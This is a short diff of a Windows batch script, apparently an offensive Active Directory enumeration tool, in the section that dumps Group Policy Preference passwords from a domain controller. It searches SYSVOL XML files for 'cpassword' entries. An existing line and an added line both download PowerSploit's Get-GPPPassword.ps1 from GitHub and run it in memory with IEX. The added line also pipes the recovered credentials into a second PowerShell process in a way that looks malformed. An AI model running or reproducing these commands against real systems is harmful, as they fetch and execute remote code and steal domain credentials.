@@ -120,6 +120,7 @@ ECHO.
 ECHO [+] Dumping Password using Group Policy Preference files on the Domain Controller'
 ECHO -------------------------------------------------------------------
 findstr /S cpassword c:\Windows\sysvol\*.xml
+echo [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1'); $m = Get-GPPPassword -Verbose; $m | powershell.exe -
 cmd.exe /c powershell.exe IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1'); $m = Get-GPPPassword -Verbose; $m
 ECHO.
 
